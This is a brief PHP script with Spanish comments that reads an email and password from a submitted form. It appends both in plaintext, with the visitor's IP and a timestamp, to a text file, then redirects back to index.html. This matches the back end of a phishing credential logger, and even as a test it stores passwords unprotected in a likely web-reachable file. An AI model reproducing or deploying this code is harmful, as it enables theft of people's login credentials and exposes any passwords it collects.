<?php
// test_post.php - guarda los datos recibidos por POST en un archivo txt

// Activar errores solo para desarrollo (opcional)
error_reporting(E_ALL);
ini_set('display_errors', '1');

// Ruta del archivo donde se guardarán los datos
$archivo = 'datos_usuarios.txt';

// Comprobar que llegaron datos por POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Recoger variables
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // Formatear la información a guardar
    $fecha = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'IP-desconocida';
    $linea = "[$fecha] IP: $ip | Email: $email | Password: $password" . PHP_EOL;

    // Guardar en el archivo (agrega al final)
    file_put_contents($archivo, $linea, FILE_APPEND | LOCK_EX);
}

// Redirigir de nuevo al formulario (opcional)
header('Location: index.html');
exit;
